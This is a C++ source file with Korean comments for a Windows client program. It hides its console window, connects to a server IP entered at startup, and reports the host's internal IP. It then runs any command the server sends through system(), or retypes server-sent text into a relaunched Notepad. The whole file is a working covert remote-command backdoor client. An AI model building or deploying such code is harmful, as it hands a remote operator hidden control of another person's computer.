// NotepadMasterCilent.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//
#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <conio.h>
#include <tlhelp32.h>
#include <string>
#include <cstdio>

#include "definition.h"

#define BUFF_SIZE 2000
#define TYPING_DELAY 150

using namespace std;

HWND h_notepad, h_edit;

void ResetNotepad()
{
	h_notepad = FindWindow(L"Notepad", NULL);
	while (!h_notepad)
	{
		cout << "메모장 핸들" << endl;
		Sleep(150);
		h_notepad = FindWindow(L"Notepad", NULL);
	}

	h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
	while (!h_edit)
		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
}
DWORD FindProcessID(LPCTSTR szProcessName)
{
	DWORD dwPID = -1;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	Process32First(hSnapShot, &pe);
	do
	{
		if (!_wcsicmp(szProcessName, pe.szExeFile))
		{
			dwPID = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);

	return dwPID;
}
void ChangeFont(int font_size, const WCHAR* font_name)
{
	HDC hdc = GetDC(h_edit);
	LOGFONT lf;
	memset(&lf, 0, sizeof(LOGFONT));

	lf.lfHeight = font_size;
	lf.lfWidth = 0;
	lf.lfEscapement = 0;
	lf.lfOrientation = 0;
	lf.lfWeight = 0;
	lf.lfItalic = 0;
	lf.lfUnderline = 0;
	lf.lfStrikeOut = 0;
	lf.lfCharSet = HANGEUL_CHARSET;
	lf.lfOutPrecision = 0;
	lf.lfClipPrecision = 0;
	lf.lfQuality = 0;
	lf.lfPitchAndFamily = 0;
	wcscpy_s(lf.lfFaceName, 32, font_name);

	HFONT Font = CreateFontIndirect(&lf);
	PostMessage(h_edit, WM_SETFONT, (WPARAM)Font, 1); // note: WM_SETFONT메세지 보내야 한다는거 구글에도 안나와 있어서 직접 리버싱하면서 알아냄 ㅠㅠ

	ReleaseDC(h_edit, hdc);
}

void replaceAll(string& str, const char* target, const char* result)
{
	string::size_type idx = str.find(target);
	while (idx != string::npos)
	{
		str.replace(idx, strlen(target), result);
		idx = str.find(target);
	}

}
int main()
{

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	PDUHello pdu_hello;
	PDUMessage* pdu_recv;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		cerr << "초기화 실패. 에러코드: %d" << WSAGetLastError();
		_getch();
		return 1;
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		cerr << "소켓 생성 실패 : " << WSAGetLastError();
		WSACleanup();
		_getch();
		return 1;
	}

	char IP[30] = "";
	cout << "IP : ";
	cin >> IP;

	server.sin_addr.s_addr = inet_addr(IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(44401);

	ShowWindow(GetForegroundWindow(), SW_HIDE);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		cerr << "연결 실패.";

		switch (WSAGetLastError())
		{
		case 2:
			cout << "서버가 없습니다." << endl;
			break;

		case 10060:
			cout << "서버 연결이 너무 오래결려 연결을 중단했습니다." << endl;
			break;

		default:
			cout << "에러코드: " << WSAGetLastError() << endl;
		}
		closesocket(s);
		WSACleanup();
		_getch();
		return 1;
	}

	cout << "성공" << endl;

	pdu_hello.protocol_type = HELLO;
	char hostname[20] = "";
	if (gethostname(hostname, 50) == 0)
		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
	MessageBoxA(0, pdu_hello.internal_ip, "internal ip", 0);

	if (send(s, (const char*)&pdu_hello, sizeof(PDUHello), 0) < 0)
	{
		system("cls");
		cerr << "서버와의 연결이 끊어졌습니다." << endl;
		closesocket(s);
		exit(1);
	}
	system("taskkill /im notepad.exe -f");

	while (TRUE)
	{
		char buff[BUFF_SIZE] = "";
		char buff_recv[BUFF_SIZE] = "";
		int len = 0;
		if (recv(s, (char*)buff_recv, BUFF_SIZE, 0) < 0)
		{
			system("cls");
			cerr << "서버와의 연결이 끊어졌습니다." << endl;
			closesocket(s);
			exit(1);
		}
		// 이스케이프 시퀸스 기능
		//string temp = buff_recv;
		//replaceAll(temp, "\\n", "\n");

		//strcpy_s(buff_recv, temp.c_str());

		pdu_recv = (PDUMessage*)buff_recv;

		int nLen = 0;

		switch (buff_recv[0])
		{
		case COMMAND: // CMD명령 실행
			nLen = WideCharToMultiByte(CP_ACP, 0, pdu_recv->message, -1, NULL, 0, NULL, NULL);
			WideCharToMultiByte(CP_ACP, 0, pdu_recv->message, -1, buff, nLen, NULL, NULL);
			system(buff);
			break;

		case 19: // 큰 글씨로 메모장 메시지 전송

			system("taskkill -f /im notepad.exe");
			system("start notepad"); // 다시 실행

			ResetNotepad(); // 핸들값 초기화
			ChangeFont(100, L"궁서");

			len = wcslen(pdu_recv->message) - 1;

			for (int i = 0; i < len; i++) // 서버에서 보낸 문자열을 하나씩 출력함
			{
				PostMessageW(h_edit, WM_IME_CHAR, pdu_recv->message[i + 1], GCS_RESULTSTR);
				Sleep(TYPING_DELAY);
				cout << "WM_CHAR 메시지 보냄" << endl;
			}
			break;
		case MESSAGE: // 메모장 메시지 전송

			system("taskkill -f /im notepad.exe");
			system("start notepad"); // 다시 실행

			ResetNotepad(); // 핸들값 초기화
			ChangeFont(21, L"맑은 고딕");

			len = wcslen(pdu_recv->message);

			for (int i = 0; i < len; i++) // 서버에서 보낸 문자열을 하나씩 출력함
			{
				PostMessageW(h_edit, WM_IME_CHAR, pdu_recv->message[i], GCS_RESULTSTR);
				Sleep(TYPING_DELAY);
				cout << "WM_CHAR 메시지 보냄" << endl;
			}
		}
		memset(buff_recv, 0, BUFF_SIZE);
	}
}

// 프로그램 실행: <Ctrl+F5> 또는 [디버그] > [디버깅하지 않고 시작] 메뉴
// 프로그램 디버그: <F5> 키 또는 [디버그] > [디버깅 시작] 메뉴

// 시작을 위한 팁: 
//   1. [솔루션 탐색기] 창을 사용하여 파일을 추가/관리합니다.
//   2. [팀 탐색기] 창을 사용하여 소스 제어에 연결합니다.
//   3. [출력] 창을 사용하여 빌드 출력 및 기타 메시지를 확인합니다.
//   4. [오류 목록] 창을 사용하여 오류를 봅니다.
//   5. [프로젝트] > [새 항목 추가]로 이동하여 새 코드 파일을 만들거나, [프로젝트] > [기존 항목 추가]로 이동하여 기존 코드 파일을 프로젝트에 추가합니다.
//   6. 나중에 이 프로젝트를 다시 열려면 [파일] > [열기] > [프로젝트]로 이동하고 .sln 파일을 선택합니다.
